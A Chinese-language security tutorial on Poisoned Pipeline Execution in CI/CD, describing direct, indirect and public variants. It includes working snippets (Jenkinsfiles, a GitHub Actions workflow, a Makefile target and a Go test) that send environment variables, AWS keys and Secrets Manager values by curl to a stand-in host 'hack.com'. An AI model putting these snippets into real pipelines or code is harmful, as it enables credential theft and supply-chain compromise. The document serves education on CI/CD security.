

# poisoned-pipeline-execution(PPE)

定义pipeline最常见的方法是使用pipeline构建的存储中托管的CI配置文件，例如：

- Jenkinsfile (Jenkins)
- gitlab-ci.yml (GitLab)
- circleci/config.yml (CircleCI),
- GitHub Actions YAML files located under .github/workflows.

当触发的时候，pipeline job将会拉取选择的源码并且执行CI配置文件中指定的命令。

直接或间接地利用pipeline命令执行的行为就是PPE，即中毒的管道执行。

一般要求攻击者能够访问代码的存储库(SCM repository)，能实现存储库的更改，即通过直接推送到远程分支或通过从一个远程的branch或者fork进行pull request来触发CI Pipeline，能够触发导致pipeline执行的事件，能够修改的文件中定义了管道直接或间接执行的命令，且管道节点可以访问非公共资源。



根据分类，PPE分为D-PPE（直接PPE）、I-PPE（间接PPE）、P-PPE（公共PPE）

## D-PPE

D-PPE即攻击者能直接的修改他们有权访问的存储库中的 CI 配置文件，方法是将更改直接推送到存储库上不受保护的远程分支，或者通过从分支或分支提交包含更改的 PR 来修改 CI 配置文件。因此D-PPE的恶意代码就在CI配置文件中。

下面是几个例子。

例如使用withAWS插件加载aws凭据：

```json
pipeline {
    agent {
        docker {
            image 'golang'
        }
    }
    stages {
        stage('hack') {
            steps {
                withAWS(credentials: 'AWS_key', region: 'us-east-1') {
                    sh 'curl -d env="$(env)" hack.com'
                }
            }
        }
    }
}
```



通过修改agent来选择特权的node，在上面执行恶意的命令：

```json
pipeline {
    agent {label 'ec2-prod-deploy'}
    stages {
        stage('hack') {
            steps {
                sh 'curl -d env="$(aws secretsmanager list-secrets --output text --query \'SecretList[*].[ARN]\' | xargs -L 1 aws secretsmanager get-secret-value --secret-id | base64)" hack.com'
            }
        }
    }
}
```

在github action中盗取凭据：

```json
name: PIPELINE
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - env:
        ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY_ID }}
        SECRET_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

        run: |
          curl -d creds="$(echo $ACCESS_KEY:$SECRET_KEY | base64 | base64)" hack.com
```



## I-PPE

I-PPE是间接的PPE，当遇到例如如下列情况：

- 管道配置从同一存储库中的单独受保护分支中提取 CI 配置文件。
- CI 配置文件与源代码存储在单独的存储库中，用户无法直接编辑它。
-  CI 构建是在 CI 系统本身中定义的，而不是在源代码中存储的文件中定义的。



遇到这些情况，攻击者无法直接的控制pipeline配置文件，但是可以控制pipeline配置文件中间接调用的文件来注入恶意的代码。

例如：

- make：执行Makefile中的命令。
- 管道执行的脚本与源代码存储在同一存储库（例如 *python myscript.py* — 其中 myscript.py 将被攻击者操纵）
- 代码测试：可在测试代码中注入恶意代码。
- 自动工具：CI 中使用的 Linters 和安全扫描器通常也依赖于存储库中的配置文件。很多时候，这些配置涉及从配置文件中定义的位置加载和运行外部代码。

例如对面下入的pipeline，无法直接控制内容，但是它的三个stage都可以被利用。

```pipeline
pipeline {
    agent {
        docker {
            image 'golang'
        }
    }
    stages {
        stage('build') {
            steps {
                withCredentials([string(credentialsId: 'dockerhub_creds', variable: 'DOCKERHUB_CREDS')]) {
                        sh '''
                            echo "running Makefile..."
                            make build
                            make clean
                        '''
                }
            }
        }
        stage('test') {
            steps {
                sh 'go test -v ./...'
            }
        }
        stage('terraform') {
            steps {
                withAWS(credentials: 'AWS_creds', region: 'us-east-1') {
                    sh 'cd terraform && terraform init && terraform plan -out=tfplan'
                }
            }
        }
    }
}
```





第一步使用了make，可以直接在makefile中插入恶意代码：

```makefile
build:
	curl -d env="$$(env)" hack.com

clean:
	echo "cleaning..."
```



第二部使用了`go test`命令进行代码的测试，GO 的测试包在存储库中具有“_test.go”后缀的文件上运行。因此控制`_test.go`后缀的文件：

```go
package main

import (
	"net/url"
	"os"
	"os/exec"
	"strings"
	"testing"
)

func TestBasic(t *testing.T) {
	num := 1

	env := strings.Join(os.Environ(), " ")
	exec.Command("curl", "-d", url.QueryEscape(env), "hack.com").Run()

	if num != 1 {
		t.Errorf("expected 1, got %d", num)
	}
}
```



第三步使用了terraform这样的自动化工具，命令是`terraform plan`，仍然可以实现攻击，参考https://github.com/rung/terraform-provider-cmdexec和https://alex.kaskaso.li/post/terraform-plan-rce



## P-PPE

如果公共存储库的 CI 构建管道运行匿名用户建议的未经审查的代码，则很容易受到公共 PPE 攻击，简称 3PE。

## 参考

https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_060422